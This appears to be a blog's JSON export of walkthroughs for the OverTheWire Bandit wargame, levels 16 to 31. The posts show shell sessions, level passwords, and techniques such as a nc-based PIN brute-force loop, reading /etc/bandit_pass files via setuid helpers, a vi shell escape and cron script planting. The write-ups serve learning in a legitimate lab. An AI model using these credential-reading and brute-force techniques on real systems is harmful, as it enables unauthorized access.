1 file changed, 1 insertion(+) bandit31@bandit:/tmp/tmp.yfyYU2PWtI/repo$ git push The authenticity of host \u0026#39;[localhost]:2220 ([127.0.0.1]:2220)\u0026#39; can\u0026#39;t be established. ED25519 key fingerprint is SHA256:C2ihUBV7ihnV1wUXRb4RrEcLfXC5CXlhmAAM/urerLY. This key is not known by any other names. Are you sure you want to continue connecting (yes/no/[fingerprint])? tes Please type \u0026#39;yes\u0026#39;, \u0026#39;no\u0026#39; or the fingerprint: yes Could not create directory \u0026#39;/home/bandit31/.ssh\u0026#39; (Permission denied). Failed to add the host to the list of known hosts (/home/bandit31/.ssh/known_hosts). _ _ _ _ | |__ __ _ _ __ __| (_) |_ | \u0026#39;_ \\ / _` | \u0026#39;_ \\ / _` | | __| | |_) | (_| | | | | (_| | | |_ |_.__/ \\__,_|_| |_|\\__,_|_|\\__| This is an OverTheWire game server. More information on http://www.overthewire.org/wargames bandit31-git@localhost\u0026#39;s password: Enumerating objects: 7, done. Counting objects: 100% (7/7), done. Delta compression using up to 2 threads Compressing objects: 100% (4/4), done. Writing objects: 100% (6/6), 508 bytes | 508.00 KiB/s, done. Total 6 (delta 1), reused 0 (delta 0), pack-reused 0 remote: ### Attempting to validate files... #### remote: remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo. remote: remote: Well done! Here is the password for the next level: remote: 3O9RfhqyAlVBEZpVb6LYStshZoqoSx5K ","date":"2024-08-18T22:40:19+03:00","permalink":"//localhost:1313/post/bandit31/","section":"post","tags":["CTF","Completed"],"title":"Bandit-Level 31"},{"categories":["Overthewire","Bandit"],"contents":"Level goal There is a git repository at ssh://bandit30-git@localhost/home/bandit30-git/repo via the port 2220. The password for the user bandit30-git is the same as for the user bandit30.\nClone the repository and find the password for the next level.\nLogin ssh bandit30@bandit.labs.overthewire.org -p 2220\nqp30ex3VLz5MDG1n91YowTv4Q8l7CDZL\nDoc git (1) - the stupid content tracker GIT DOCUMENTATION Solution For this level I`ll use the same initial process I`ve used until now.\nClone-\u0026gt;Check what`s in the repo-\u0026gt;try to find a password. bandit30@bandit:~$ mktemp -d /tmp/tmp.bcYsejHEys bandit30@bandit:~$ cd /tmp/tmp.bcYsejHEys bandit30@bandit:/tmp/tmp.bcYsejHEys$ git clone ssh://bandit30-git@localhost:2220/home/bandit30-git/repo Cloning into \u0026#39;repo\u0026#39;... The authenticity of host \u0026#39;[localhost]:2220 ([127.0.0.1]:2220)\u0026#39; can\u0026#39;t be established. ED25519 key fingerprint is SHA256:C2ihUBV7ihnV1wUXRb4RrEcLfXC5CXlhmAAM/urerLY. This key is not known by any other names. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Could not create directory \u0026#39;/home/bandit30/.ssh\u0026#39; (Permission denied). Failed to add the host to the list of known hosts (/home/bandit30/.ssh/known_hosts). _ _ _ _ | |__ __ _ _ __ __| (_) |_ | \u0026#39;_ \\ / _` | \u0026#39;_ \\ / _` | | __| | |_) | (_| | | | | (_| | | |_ |_.__/ \\__,_|_| |_|\\__,_|_|\\__| This is an OverTheWire game server. More information on http://www.overthewire.org/wargames bandit30-git@localhost\u0026#39;s password: remote: Enumerating objects: 4, done. remote: Counting objects: 100% (4/4), done. remote: Total 4 (delta 0), reused 0 (delta 0), pack-reused 0 Receiving objects: 100% (4/4), done. bandit30@bandit:/tmp/tmp.bcYsejHEys$ ls repo bandit30@bandit:/tmp/tmp.bcYsejHEys$ cd repo/ bandit30@bandit:/tmp/tmp.bcYsejHEys/repo$ ls README.md bandit30@bandit:/tmp/tmp.bcYsejHEys/repo$ cat README.md just an epmty file... muahaha\nFor git, there exist tags which can sometimes have information.\nbandit30@bandit:/tmp/tmp.bcYsejHEys/repo$ git tag secret bandit30@bandit:/tmp/tmp.bcYsejHEys/repo$ git show secret fb5S2xb7bRyFmAvQYQGEqsbhVyJqhnDy ","date":"2024-08-18T22:31:45+03:00","permalink":"//localhost:1313/post/bandit30/","section":"post","tags":["CTF","Completed"],"title":"Bandit-Level 30"},{"categories":["Overthewire","Bandit"],"contents":"Level goal There is a git repository at ssh://bandit29-git@localhost/home/bandit29-git/repo via the port 2220. The password for the user bandit29-git is the same as for the user bandit29.\nClone the repository and find the password for the next level.\nLogin ssh bandit29@bandit.labs.overthewire.org -p 2220\n4pT1t5DENaYuqnqvadYs1oE4QLCdjmJ7\nDoc git (1) - the stupid content tracker clone Clone a repository into a new directory log Show commit logs GIT DOCUMENTATION Solution For this level I`ll use the same initial process I`ve used until now.\nClone-\u0026gt;Check what`s in the repo-\u0026gt;try to find a password. bandit29@bandit:~$ ls bandit29@bandit:~$ mktemp -d /tmp/tmp.DhJWSGlZlb bandit29@bandit:~$ cd /tmp/tmp.DhJWSGlZlb bandit29@bandit:/tmp/tmp.DhJWSGlZlb$ git clone ssh://bandit29-git@localhost:2220/home/bandit29-git/repo Cloning into \u0026#39;repo\u0026#39;... The authenticity of host \u0026#39;[localhost]:2220 ([127.0.0.1]:2220)\u0026#39; can\u0026#39;t be established. ED25519 key fingerprint is SHA256:C2ihUBV7ihnV1wUXRb4RrEcLfXC5CXlhmAAM/urerLY. This key is not known by any other names. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Could not create directory \u0026#39;/home/bandit29/.ssh\u0026#39; (Permission denied). Failed to add the host to the list of known hosts (/home/bandit29/.ssh/known_hosts). _ _ _ _ | |__ __ _ _ __ __| (_) |_ | \u0026#39;_ \\ / _` | \u0026#39;_ \\ / _` | | __| | |_) | (_| | | | | (_| | | |_ |_.__/ \\__,_|_| |_|\\__,_|_|\\__| This is an OverTheWire game server. More information on http://www.overthewire.org/wargames bandit29-git@localhost\u0026#39;s password: remote: Enumerating objects: 16, done. remote: Counting objects: 100% (16/16), done. remote: Compressing objects: 100% (11/11), done. Receiving objects: 100% (16/16), 1.43 KiB | 734.00 KiB/s, done. remote: Total 16 (delta 2), reused 0 (delta 0), pack-reused 0 Resolving deltas: 100% (2/2), done. bandit29@bandit:/tmp/tmp.DhJWSGlZlb$ ls repo bandit29@bandit:/tmp/tmp.DhJWSGlZlb$ cd repo/ bandit29@bandit:/tmp/tmp.DhJWSGlZlb/repo$ ls README.md bandit29@bandit:/tmp/tmp.DhJWSGlZlb/repo$ cat README.md # Bandit Notes Some notes for bandit30 of bandit. ## credentials - username: bandit30 - password: \u0026lt;no passwords in production!\u0026gt;\nAs we can see, there`s no password in production. production refers to a branch of the project. A repo can have multiple branches at the same time. We can find the password for the next level by listing the branches, moving into another branch and checking the state of the README there. bandit29@bandit:/tmp/tmp.DhJWSGlZlb/repo$ git branch -r origin/HEAD -\u0026gt; origin/master origin/dev origin/master origin/sploits-dev bandit29@bandit:/tmp/tmp.DhJWSGlZlb/repo$ git checkout dev Switched to branch \u0026#39;dev\u0026#39; bandit29@bandit:/tmp/tmp.DhJWSGlZlb/repo$ git log commit 5a53eb83a43bac1f0b4e223e469b40ef68a4b6e6 (HEAD -\u0026gt; dev) Author: Ben Dover \u0026lt;noone@overthewire.org\u0026gt; Date: Wed Jul 17 15:57:31 2024 +0000 initial commit of README.md bandit29@bandit:/tmp/tmp.DhJWSGlZlb/repo$ cat README.md # Bandit Notes Some notes for bandit30 of bandit. ## credentials - username: bandit29 - password: qp30ex3VLz5MDG1n91YowTv4Q8l7CDZL\n","date":"2024-08-18T22:14:49+03:00","permalink":"//localhost:1313/post/bandit29/","section":"post","tags":["CTF","Completed"],"title":"Bandit-Level 29"},{"categories":["Overthewire","Bandit"],"contents":"Level goal There is a git repository at ssh://bandit28-git@localhost/home/bandit28-git/repo via the port 2220. The password for the user bandit28-git is the same as for the user bandit28.\nClone the repository and find the password for the next level.\nLogin ssh bandit28@bandit.labs.overthewire.org -p 2220\nYz9IpL0sBcCeuG7m9uQFt8ZNpS4HZRcN\nDoc git (1) - the stupid content tracker clone Clone a repository into a new directory log Show commit logs GIT DOCUMENTATION Solution Here you`ll need to know how to use a version control system in order to get information that was available at one point in time but now isn`t. Firstly, clone the repo to see what we are working with. bandit28@bandit:~$ mktemp -d /tmp/tmp.1nHId6dQ2k bandit28@bandit:~$ cd /tmp/tmp.1nHId6dQ2k bandit28@bandit:/tmp/tmp.1nHId6dQ2k$ git clone ssh://bandit28-git@localhost:2220/home/bandit28-git/repo bandit28@bandit:/tmp/tmp.1nHId6dQ2k$ ls repo bandit28@bandit:/tmp/tmp.1nHId6dQ2k$ cd repo bandit28@bandit:/tmp/tmp.1nHId6dQ2k/repo$ ls README.md bandit28@bandit:/tmp/tmp.1nHId6dQ2k/repo$ cat README.md # Bandit Notes Some notes for level29 of bandit. ## credentials - username: bandit29 - password: xxxxxxxxxx\nAs you can see the password seems to not be present this time. git status shows you the current start of the project but, while using git log, you can see the logs of the changes made. Each log has associated a hash specific to it which helps you checkout a commit at a previous time. Doing that, we could get the password from the text file before the point of removal.\nbandit28@bandit:/tmp/tmp.1nHId6dQ2k/repo$ git status On branch master Your branch is up to date with \u0026#39;origin/master\u0026#39;. nothing to commit, working tree clean bandit28@bandit:/tmp/tmp.1nHId6dQ2k/repo$ git log commit 8cbd1e08d1879415541ba19ddee3579e80e3f61a (HEAD -\u0026gt; master, origin/master, origin/HEAD) Author: Morla Porla \u0026lt;morla@overthewire.org\u0026gt; Date: Wed Jul 17 15:57:30 2024 +0000 fix info leak commit 73f5d0435070c8922da12177dc93f40b2285e22a Author: Morla Porla \u0026lt;morla@overthewire.org\u0026gt; Date: Wed Jul 17 15:57:30 2024 +0000 add missing data commit 5f7265568c7b503b276ec20f677b68c92b43b712 Author: Ben Dover \u0026lt;noone@overthewire.org\u0026gt; Date: Wed Jul 17 15:57:30 2024 +0000 initial commit of README.md bandit28@bandit:/tmp/tmp.1nHId6dQ2k/repo$ checkout 73f5d0435070c8922da12177dc93f40b2285e22a checkout: command not found bandit28@bandit:/tmp/tmp.1nHId6dQ2k/repo$ git checkout 73f5d0435070c8922da12177dc93f40b2285e22a Note: switching to \u0026#39;73f5d0435070c8922da12177dc93f40b2285e22a\u0026#39;. You are in \u0026#39;detached HEAD\u0026#39; state. You can look around, make experimental changes and commit them, and you can discard any commits you make in this state without impacting any branches by switching back to a branch. If you want to create a new branch to retain commits you create, you may do so (now or later) by using -c with the switch command. Example: git switch -c \u0026lt;new-branch-name\u0026gt; Or undo this operation with: git switch - Turn off this advice by setting config variable advice.detachedHead to false HEAD is now at 73f5d04 add missing data bandit28@bandit:/tmp/tmp.1nHId6dQ2k/repo$ ls README.md bandit28@bandit:/tmp/tmp.1nHId6dQ2k/repo$ cat README.md # Bandit Notes Some notes for level29 of bandit. ## credentials - username: bandit29 - password: 4pT1t5DENaYuqnqvadYs1oE4QLCdjmJ ","date":"2024-08-18T21:54:46+03:00","permalink":"//localhost:1313/post/bandit28/","section":"post","tags":["CTF","Completed"],"title":"Bandit-Level 28"},{"categories":["Overthewire","Bandit"],"contents":"Level goal There is a git repository at ssh://bandit27-git@localhost/home/bandit27-git/repo via the port 2220. The password for the user bandit27-git is the same as for the user bandit27.\nClone the repository and find the password for the next level.\nLogin ssh bandit27@bandit.labs.overthewire.org -p 2220\nupsNCc7vzaRDx6oZC6GiR6ERwe1MowGB\nDoc git (1) - the stupid content tracker clone Clone a repository into a new directory GIT DOCUMENTATION Solution This section of bandit focuses souly on teaching you undestanding what a version control system is and how to use it. We are gonna clone the repository using the ssh connection listed above. Modify localhost with localhost:2220 since you want to make the request on port 2220. When you are prompted for a password simply put the password of bandit27. bandit27@bandit:~$ ls bandit27@bandit:~$ mktemp -d /tmp/tmp.EL8vk6woto bandit27@bandit:/tmp/tmp.EL8vk6woto$ git clone ssh://bandit27-git@localhost:2220/home/bandit27-git/repo Cloning into \u0026#39;repo\u0026#39;... The authenticity of host \u0026#39;[localhost]:2220 ([127.0.0.1]:2220)\u0026#39; can\u0026#39;t be established. ED25519 key fingerprint is SHA256:C2ihUBV7ihnV1wUXRb4RrEcLfXC5CXlhmAAM/urerLY. This key is not known by any other names. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Could not create directory \u0026#39;/home/bandit27/.ssh\u0026#39; (Permission denied). Failed to add the host to the list of known hosts (/home/bandit27/.ssh/known_hosts). _ _ _ _ | |__ __ _ _ __ __| (_) |_ | \u0026#39;_ \\ / _` | \u0026#39;_ \\ / _` | | __| | |_) | (_| | | | | (_| | | |_ |_.__/ \\__,_|_| |_|\\__,_|_|\\__| This is an OverTheWire game server. More information on http://www.overthewire.org/wargames bandit27-git@localhost\u0026#39;s password: remote: Enumerating objects: 3, done. remote: Counting objects: 100% (3/3), done. remote: Compressing objects: 100% (2/2), done. remote: Total 3 (delta 0), reused 0 (delta 0), pack-reused 0 Receiving objects: 100% (3/3), done.\nWhen you use clone, you are gonna get the files of the repository you are trying to clone at a certain state in time. Now watching our directory, there appears to be a new directory, that being the repository we`ve just cloned. cat README for the password of bandit28.\nbandit27@bandit:/tmp/tmp.EL8vk6woto$ ls repo bandit27@bandit:/tmp/tmp.EL8vk6woto$ cd repo/ bandit27@bandit:/tmp/tmp.EL8vk6woto/repo$ ls README bandit27@bandit:/tmp/tmp.EL8vk6woto/repo$ cat README The password to the next level is: Yz9IpL0sBcCeuG7m9uQFt8ZNpS4HZRcN ","date":"2024-08-18T21:44:49+03:00","permalink":"//localhost:1313/post/bandit27/","section":"post","tags":["CTF","Completed"],"title":"Bandit-Level 27"},{"categories":["Overthewire","Bandit"],"contents":"Level goal Good job getting a shell! Now hurry and grab the password for bandit27!\nLogin Keep the login connection from bandit25!\nSolution All you have to do in this level is set the shell as bash from vi and then cat the password for the next level. :set shell=/bin/bash :shell bandit26@bandit:~$ ls bandit27-do text.txt bandit26@bandit:~$ cat text.txt _ _ _ _ ___ __ | | | (_) | |__ \\ / / | |__ __ _ _ __ __| |_| |_ ) / /_ | \u0026#39;_ \\ / _` | \u0026#39;_ \\ / _` | | __| / / \u0026#39;_ \\ | |_) | (_| | | | | (_| | | |_ / /| (_) | |_.__/ \\__,_|_| |_|\\__,_|_|\\__|____\\___/ bandit26@bandit:~$ ./bandit27-do cat /etc/bandit_pass/bandit27 upsNCc7vzaRDx6oZC6GiR6ERwe1MowGB\n","date":"2024-08-18T21:40:23+03:00","permalink":"//localhost:1313/post/bandit26/","section":"post","tags":["CTF","Completed"],"title":"Bandit-Level 26"},{"categories":["Overthewire","Bandit"],"contents":"Sollution idea : MayADevBe Blog Level goal Logging in to bandit26 from bandit25 should be fairly easy… The shell for user bandit26 is not /bin/bash, but something else. Find out what it is, how it works and how to break out of it. NOTE: if you’re a Windows user and typically use Powershell to ssh into bandit: Powershell is known to cause issues with the intended solution to this level. You should use command prompt instead.\nLogin ssh bandit25@bandit.labs.overthewire.org -p 2220\niCi86ttT4KSNe1armKiwbQNmB3YJP3q4\nWhat is a shell? A shell is a type of computer program called a command-line interpreter that lets Linux and Unix users control their operating systems with command-line interfaces. Shells allow users to communicate efficiently and directly with their operating systems. Source\nDoc ssh (1) - OpenSSH remote login client Step 1. When we try to log into the shell of bandit26 using ssh, we are instantly being kicked out without being able to do anything. Let`s see what type of shell we are working with\nbandit25@bandit:~$ cat /etc/passwd | grep bandit26 bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext bandit25@bandit:~$ cat /usr/bin/show bandit25@bandit:~$ cat /usr/bin/showtext #!/bin/sh export TERM=linux exec more ~/text.txt exit 0 The shell present for user bandit26 seems to be showtext. After inspecting it, it seems like all it does is display a text file and then exit right afterwards. A sollution to this problem would be minimizing your terminal as much as possible such that the text file could not be fully loaded, giving you the oportunity to go into vi and execute commands. vi\nAfter you are in vi you can just press :, put e as execute and:\ncat /etc/bandit_pass/bandit26 s0773xxkk0MXfdqOfPRVr9L3jJBUOgCZ ","date":"2024-08-18T20:54:51+03:00","permalink":"//localhost:1313/post/bandit25/","section":"post","tags":["CTF","Completed"],"title":"Bandit-Level 25"},{"categories":["Overthewire","Bandit"],"contents":"Level goal A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.\nYou do not need to create new connections each time.\nLogin ssh bandit24@bandit.labs.overthewire.org -p 2220\ngb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8\nDoc nc (1) - arbitrary TCP and UDP connections and listens Articles Usefull read if you are new to bash scripting\nFile permissions\nSolution We will write a bash script again since we need to repeatedly send request and we wouldn`t want to do that by hand. Create a temp dir mktemp -d and touch a file and give it execute rights.\nMy script: #!/bin/bash for a in {0000..9999} do echo \u0026#34;gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $a\u0026#34;; done | nc localhost 30002 \u0026gt; keys.txt cat keys.txt | grep bandit25 Script breakdown For a variable a in the range of 0000 and 9999, we are gonna echo the current password and $a(values of a) and pipe it to the daemon on port 30002 since you can`t open nc before the loop without it waiting for a kill before letting the loop do the parsing. The ouput of all of this will be ouput into keys.txt. The grep doesn`t matter since the daemon breaks either way when inserting the correct value.\nbandit24@bandit:/tmp/tmp.dxMibZCdBZ$ ./script.sh I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space. The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4 ","date":"2024-08-18T20:29:04+03:00","permalink":"//localhost:1313/post/bandit24/","section":"post","tags":["CTF","Completed"],"title":"Bandit-Level 24"},{"categories":["Overthewire","Bandit"],"contents":"Level goal A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.\nNOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!\nNOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…\nLogin ssh bandit23@bandit.labs.overthewire.org -p 2220\n0Zf11ioIjMVN551jX3CmStKLYqjk54Ga\nDoc Usefull read if you are new to bash scripting\nFile permissions\nSolution With the same approach as until now, let`s see what the script being run does.\nbandit23@bandit:~$ cd /etc/cron.d bandit23@bandit:/etc/cron.d$ ls cronjob_bandit22 cronjob_bandit23 cronjob_bandit24 e2scrub_all otw-tmp-dir\tsysstat bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24 @reboot bandit24 /usr/bin/cronjob_bandit24.sh \u0026amp;\u0026gt; /dev/null * * * * * bandit24 /usr/bin/cronjob_bandit24.sh \u0026amp;\u0026gt; /dev/null bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh #!/bin/bash myname=$(whoami) cd /var/spool/$myname/foo echo \u0026#34;Executing and deleting all scripts in /var/spool/$myname/foo:\u0026#34; for i in * .*; do if [ \u0026#34;$i\u0026#34; != \u0026#34;.\u0026#34; -a \u0026#34;$i\u0026#34; != \u0026#34;..\u0026#34; ]; then echo \u0026#34;Handling $i\u0026#34; owner=\u0026#34;$(stat --format \u0026#34;%U\u0026#34; ./$i)\u0026#34; if [ \u0026#34;${owner}\u0026#34; = \u0026#34;bandit23\u0026#34; ]; then timeout -s 9 60 ./$i fi rm -f ./$i fi done You can break the script down line by line and get to the conclusion that basically, it runs all the valid scripts in foo, afterwards deletes all the contents of the directory. The interval for this process is 1 minute so we could just make our own script that cat`s the password for bandit24 and redirects it somewhere we want. We don`t care what happens to the script afterwards. (Chmod +x) makes a bash script executable. (Chmod +r) makes a bash script able to read.\nbandit23@bandit:/etc/cron.d$ mktemp -d /tmp/tmp.VKKpqs7HyM bandit23@bandit:/etc/cron.d$ cd /tmp/tmp.VKKpqs7HyM bandit23@bandit:/tmp/tmp.VKKpqs7HyM$ touch script.sh bandit23@bandit:/tmp/tmp.VKKpqs7HyM$ chmod +x script.sh bandit23@bandit:/tmp/tmp.VKKpqs7HyM$ nano script.sh Script: #!/bin/bash cat /etc/bandit_pass/bandit24 \u0026gt; /tmp/tmp.VKKpqs7HyM/key.txt Now cat the file that came into your directory.\nbandit23@bandit:/tmp/tmp.VKKpqs7HyM$ cat key.txt gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 ","date":"2024-08-18T19:37:30+03:00","permalink":"//localhost:1313/post/bandit23/","section":"post","tags":["CTF","Completed"],"title":"Bandit-Level 23"},{"categories":["Overthewire","Bandit"],"contents":"Level goal A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.\nNOTE: Looking at shell scripts written by other people is a very useful skill. The script for this level is intentionally made easy to read. If you are having problems understanding what it does, try executing it to see the debug information it prints.\nLogin ssh bandit22@bandit.labs.overthewire.org -p 2220\ntRae0UfB9v0UzbCdn9cY0gQnds9GF58Q\nDoc Usefull read if you are new to bash scripting\nSolution Same cron setup as in level 21, let`s follow the trace. bandit22@bandit:~$ cd /etc/cron.d bandit22@bandit:/etc/cron.d$ ls cronjob_bandit22 cronjob_bandit23 cronjob_bandit24 e2scrub_all otw-tmp-dir\tsysstat bandit22@bandit:/etc/cron.d$ cat cronjob_bandit23 @reboot bandit23 /usr/bin/cronjob_bandit23.sh \u0026amp;\u0026gt; /dev/null * * * * * bandit23 /usr/bin/cronjob_bandit23.sh \u0026amp;\u0026gt; /dev/null bandit22@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit23.sh #!/bin/bash myname=$(whoami) mytarget=$(echo I am user $myname | md5sum | cut -d \u0026#39; \u0026#39; -f 1) echo \u0026#34;Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget\u0026#34; cat /etc/bandit_pass/$myname \u0026gt; /tmp/$mytarget\nThis time the script does basically the same thing by copying the password to the level to /tmp and then echoing it to the screen. The difference this time is that it utilizes variables, \u0026amp;. If we would run the script as it is, it should print out the current password. bandit22@bandit:/usr/bin$ ./cronjob_bandit23.sh Copying passwordfile /etc/bandit_pass/bandit22 to /tmp/8169b67bd894ddbb4412f91573b38db3\nNow, you have the option of setting the environment variable myname as bandit23 and run the commands from the script to get the password for level 23. bandit22@bandit:/usr/bin$ myname=bandit23 bandit22@bandit:/usr/bin$ echo I am user $myname | md5sum | cut -d \u0026#39; \u0026#39; -f 1 8ca319486bfbbc3663ea0fbe81326349 bandit22@bandit:/usr/bin$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349 0Zf11ioIjMVN551jX3CmStKLYqjk54Ga\n","date":"2024-08-18T19:24:13+03:00","permalink":"//localhost:1313/post/bandit22/","section":"post","tags":["CTF","Completed"],"title":"Bandit-Level 22"},{"categories":["Overthewire","Bandit"],"contents":"Level goal A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.\nLogin ssh bandit21@bandit.labs.overthewire.org -p 2220\nEeoULMCra2q0dSkYj561DX7s1CpBuOBt\nDoc Usefull read if you are new to bash scripting\nSolution Let`s inspect the cronjob associated with the next level in /etc/crond.d bandit21@bandit:~$ cd /etc/cron.d bandit21@bandit:/etc/cron.d$ ls cronjob_bandit22 cronjob_bandit23 cronjob_bandit24 e2scrub_all otw-tmp-dir\tsysstat bandit21@bandit:/etc/cron.d$ cat cronjob_bandit22 @reboot bandit22 /usr/bin/cronjob_bandit22.sh \u0026amp;\u0026gt; /dev/null * * * * * bandit22 /usr/bin/cronjob_bandit22.sh \u0026amp;\u0026gt; /dev/null\nAfter using cat on cronjob_bandit22 we can see that a shell script is being run at reboot. Navigate to it and find out it`s contents. bandit21@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit22.sh #!/bin/bash chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv cat /etc/bandit_pass/bandit22 \u0026gt; /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv\nBasically, all it is doing is redirecting the content of the password for bandit22 into a file in the temp registry. Check the file and there`s the flag! bandit21@bandit:/etc/cron.d$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv tRae0UfB9v0UzbCdn9cY0gQnds9GF58Q\n","date":"2024-08-18T19:13:40+03:00","permalink":"//localhost:1313/post/bandit21/","section":"post","tags":["CTF","Completed"],"title":"Bandit-Level 21"},{"categories":["Overthewire","Bandit"],"contents":"Level goal There is a setuid binary in the homedirectory that does the following: it makes a connection to localhost on the port you specify as a commandline argument. It then reads a line of text from the connection and compares it to the password in the previous level (bandit20). If the password is correct, it will transmit the password for the next level (bandit21).\nNOTE: Try connecting to your own network daemon to see if it works as you think\nLogin ssh bandit20@bandit.labs.overthewire.org -p 2220\n0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO\nDoc nc (1) - arbitrary TCP and UDP connections and listens \u0026amp; - makes a process run in the background Solution To solve this level, you need to create a server that listens on an arbitrary port and pipe into it the password for your current level. After that, running the binary present in your home dir suconnect should output the password for the next level. bandit20@bandit:~$ echo \u0026#34;0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO\u0026#34; | nc -l localhost 30005 \u0026amp; [1] 1630689 bandit20@bandit:~$ ./suconnect 30005 Read: 0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO Password matches, sending next password EeoULMCra2q0dSkYj561DX7s1CpBuOBt\n","date":"2024-08-18T18:45:25+03:00","permalink":"//localhost:1313/post/bandit20/","section":"post","tags":["CTF","Completed"],"title":"Bandit-Level 20"},{"categories":["Overthewire","Bandit"],"contents":"Level goal To gain access to the next level, you should use the setuid binary in the homedirectory. Execute it without arguments to find out how to use it. The password for this level can be found in the usual place (/etc/bandit_pass), after you have used the setuid binary.\nLogin ssh bandit19@bandit.labs.overthewire.org -p 2220\ncGWpMaKXVwDUNgPAVJbWYuGHVn9zl3j8\nSolution When using ls in homedir, you can see the presence of bandit20-do. Running it with the prefix ./ gives you the ability to execute commands with the permissions of the user bandit20. Therefore, you could just cat the contents of /etc/bandit_pass/bandit20 to get the password needed for the next level. bandit19@bandit:~$ ls bandit20-do bandit19@bandit:~$ ./bandit20-do cat /etc/bandit_pass/bandit20 0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO\n","date":"2024-08-18T18:41:33+03:00","permalink":"//localhost:1313/post/bandit19/","section":"post","tags":["CTF","Completed"],"title":"Bandit-Level 19"},{"categories":["Overthewire","Bandit"],"contents":"Level goal The password for the next level is stored in a file readme in the homedirectory. Unfortunately, someone has modified .bashrc to log you out when you log in with SSH.\nLogin ssh bandit18@bandit.labs.overthewire.org -p 2220\nx2gLTTjFwMOhQ8oWNbMN362QKxfRqGlO\nDoc ssh (1) - OpenSSH remote login client Solution This is a very easy sollution just like the one from the previous level. Since you get logged out right after logging in you can`t really do much since you can`t run any commands right? Well you could just pass the output of echo \u0026ldquo;cat readme\u0026rdquo; into the ssh login and it will cat the required file readme right at the start, therefore you don`t need to actually do anything in the terminal yourself. 06:32:06 archie@Archie tmp.sZImFQt5fw → echo \u0026#34;cat readme\u0026#34; | ssh bandit18@bandit.labs.overthewire.org -p 2220 Pseudo-terminal will not be allocated because stdin is not a terminal. _ _ _ _ | |__ __ _ _ __ __| (_) |_ | \u0026#39;_ \\ / _` | \u0026#39;_ \\ / _` | | __| | |_) | (_| | | | | (_| | | |_ |_.__/ \\__,_|_| |_|\\__,_|_|\\__| This is an OverTheWire game server. More information on http://www.overthewire.org/wargames bandit18@bandit.labs.overthewire.org\u0026#39;s password: cGWpMaKXVwDUNgPAVJbWYuGHVn9zl3j8\n","date":"2024-08-18T18:31:40+03:00","permalink":"//localhost:1313/post/bandit18/","section":"post","tags":["CTF","Completed"],"title":"Bandit-Level 18"},{"categories":["Overthewire","Bandit"],"contents":"Level goal There are 2 files in the homedirectory: passwords.old and passwords.new. The password for the next level is in passwords.new and is the only line that has been changed between passwords.old and passwords.new NOTE: if you have solved this level and see ‘Byebye!’ when trying to log into bandit18, this is related to the next level, bandit19\nLogin ssh -i key.private bandit17@bandit.labs.overthewire.org -p 2220\nkey.private from level 16\nDoc diff (1) - compare files line by line Solution Very simple level overall. When using ls you see 2 files present, passwords.old and passwords.new. Just use diff between these 2 files and see the line that was changed from old to new, that being the password for the next level. bandit17@bandit:~$ diff passwords.new passwords.old 42c42 \u0026lt; x2gLTTjFwMOhQ8oWNbMN362QKxfRqGlO --- \u0026gt; bSrACvJvvBSxEM2SGsV5sn09vc3xgqyp\n","date":"2024-08-18T18:26:37+03:00","permalink":"//localhost:1313/post/bandit17/","section":"post","tags":["CTF","Completed"],"title":"Bandit-Level 17"},{"categories":["Overthewire","Bandit"],"contents":"Level goal The credentials for the next level can be retrieved by submitting the password of the current level to a port on localhost in the range 31000 to 32000. First find out which of these ports have a server listening on them. Then find out which of those speak SSL/TLS and which don’t. There is only 1 server that will give the next credentials, the others will simply send back to you whatever you send to it. Helpful note: Getting “DONE”, “RENEGOTIATING” or “KEYUPDATE”? Read the “CONNECTED COMMANDS” section in the manpage.\nLogin ssh bandit16@bandit.labs.overthewire.org -p 2220\nkSkvUpMQ7lBYyCM4GBPvCvT1BfWRy0Dx\nDoc nmap (1) - Network exploration tool and security / port scanner SERVICE/VERSION DETECTION: -sV: Probe open ports to determine service/version info --version-intensity \u0026lt;level\u0026gt;: Set from 0 (light) to 9 (try all probes) --version-light: Limit to most likely probes (intensity 2) --version-all: Try every single probe (intensity 9) --version-trace: Show detailed version scan activity (for debugging) What is nmap (u`ll use it again) Nmap (\u0026ldquo;Network Mapper\u0026rdquo;) is a free and open source utility for network discovery and security auditing. Many systems and network administrators also find it useful for tasks such as network inventory, managing service upgrade schedules, and monitoring host or service uptime. Nmap uses raw IP packets in novel ways to determine what hosts are available on the network, what services (application name and version) those hosts are offering, what operating systems (and OS versions) they are running, what type of packet filters/firewalls are in use, and dozens of other characteristics. It was designed to rapidly scan large networks, but works fine against single hosts. Source\nSolution We can use nmap in order to scan certain aspects of a network w.r.t. our needs. Sice the level goal states that the password is nested on localhost on a port in range 31000-32000 we should scan the range of ports with a 